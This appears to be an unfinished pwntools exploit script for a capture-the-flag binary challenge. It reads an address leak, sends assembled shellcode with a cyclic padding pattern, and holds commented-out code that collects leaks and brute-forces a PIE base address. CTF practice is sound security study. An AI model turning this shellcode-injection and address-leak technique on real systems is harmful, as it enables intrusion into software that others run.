from pwn import *


elf = context.binary = ELF("./main")
# p = process()
p = process()
# p = remote("chal.wwctf.com", 7001)


# leaks = [2286291, 12514003, 4440787, 11932371, 9745107, 15033043, 13742803, 13542099, 4702931, 1147603, 7017171, 647891, 3580627, 12755667, 16085715, 10171091, 12583635, 13722323, 6947539, 13300435, 7238355, 7201491, 312019, 9855699, 8200915, 13066963, 2478803, 10531539, 11760339, 16048851, 6120147, 4678355, 11989715, 15983315, 15266515, 713427, 12534483, 14541523, 5284563, 1774291, 9044691, 10166995, 4289235, 11297491, 8942291, 2405075, 4707027, 1938131, 13435603, 6705875, 578259, 12051155, 295635, 8995539, 4575955, 5792467, 14394067, 14672595, 2908883, 14525139, 16138963, 11133651, 13972179, 3859155, 15114963, 10449619, 10109651, 2728659, 10568403, 5563091, 664275, 9622227, 1077971, 1970899, 15229651, 12493523, 11449043, 8839891, 8471251, 8098515, 9839315, 15057619, 14381779, 13894355, 303827, 9433811, 1274579, 7283411, 3588819, 10187475, 9753299, 7963347, 4264659, 10982099, 5538515, 9536211, 11375315, 15393491, 2663123, 11326163]

# context.log_level = "error"

# count = 0

# for i in range(100):
#     p = remote("chal.wwctf.com",7001)
#     leak = int(p.recvline().strip(),16)
#     print("leak",hex(leak))
#     # p.interactive()
#     if leak in leaks:
#         print("repeated: ")
#         count += 1
#     leaks.append(leak)
#     p.close()

# print(leaks)
# print(count)

                            
# for base_candidate in range(0x555555554000, 0x7fff00000000, 0x1000):  # reasonable PIE ranges
#     if (base_candidate + 0x12D3) & 0xffffff == 0xf4e2d3:
#         print(f"Possible base: {hex(base_candidate)}")


leak = int(p.recvline().strip(),16)
print("leak",hex(leak))


gdb.attach(p,"""
b *main+413
b *0x1337104f
""")
p.sendline(asm(f"""
mov rax, qword ptr gs:0
""") + cyclic(20))

p.interactive()

# 0x555555554000